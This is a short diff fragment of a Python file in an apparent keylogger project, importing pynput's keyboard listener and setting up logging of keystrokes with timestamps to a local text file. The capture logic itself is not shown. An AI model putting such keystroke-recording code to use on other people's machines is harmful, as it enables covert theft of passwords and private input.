@@ -1,6 +1,5 @@
 from pynput.keyboard import Key,Listener
 import logging
-import getpass
 
 logging.basicConfig(filename="C:/Users/KIIT/Downloads/Github/Keylogger/key_log.txt",filemode='a',
                     level=logging.DEBUG,format='%(asctime)s:%(message)s:',datefmt='%m/%d/%Y %I:%M:%S%p')
